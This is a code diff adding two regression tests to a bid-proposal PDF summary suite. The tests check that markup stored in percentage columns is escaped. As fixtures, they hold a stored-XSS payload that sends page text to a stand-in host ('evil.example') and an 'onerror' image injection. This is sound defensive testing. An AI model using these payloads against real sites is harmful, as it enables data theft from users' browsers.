@@ -173,6 +173,39 @@ describe('bid proposal PDF summary', () => {
     expect(html).toContain('<td class="right subtotal-val">$0.00</td>');
   });
 
+  it('never emits a summary row for a non-numeric percentage', async () => {
+    // validate-snapshot accepts any string for any column and SQLite's REAL
+    // affinity stores it as TEXT, so a pushed snapshot can put markup in a
+    // percentage column. bidCalc's `|| 0` does not catch it (a non-empty
+    // string is truthy), so the amount comes out NaN — and `NaN !== 0` is
+    // true, which the dollar-based row gate would have let through. The old
+    // percentage gate blocked this by accident; the new one must do it on
+    // purpose.
+    const { jobId } = makeJob({ overhead: 10 });
+    const attack = '0<script>fetch("https://evil.example/"+document.body.innerText)</script>';
+    for (const column of [
+      'escalation_percent', 'tax_percent', 'overhead_percent', 'profit_percent', 'bond_percent',
+    ]) {
+      db.prepare(`UPDATE jobs SET ${column} = ? WHERE id = ?`).run(attack, jobId);
+      const html = await getHtml(jobId);
+      expect(html).not.toContain('<script>');
+      expect(html).not.toContain('evil.example');
+      // And no zero-dollar row snuck in behind the NaN.
+      expect(summaryValues(html).slice(0, -1)).not.toContain(0);
+      db.prepare(`UPDATE jobs SET ${column} = 0 WHERE id = ?`).run(jobId);
+    }
+  });
+
+  it('escapes a percentage that carries markup but still computes', async () => {
+    // '10' is numeric to SQLite but the label is built from the raw column,
+    // so anything stored alongside it must not reach the document as markup.
+    const { jobId } = makeJob({ overhead: 10 });
+    db.prepare('UPDATE jobs SET tax_percent = ? WHERE id = ?').run('8<img src=x onerror=alert(1)>', jobId);
+    const html = await getHtml(jobId);
+    expect(html).not.toContain('<img src=x');
+    expect(html).not.toContain('onerror');
+  });
+
   it('sends a policy that forbids script and network access', async () => {
     const { jobId } = makeJob({ overhead: 10 });
     const html = await getHtml(jobId);
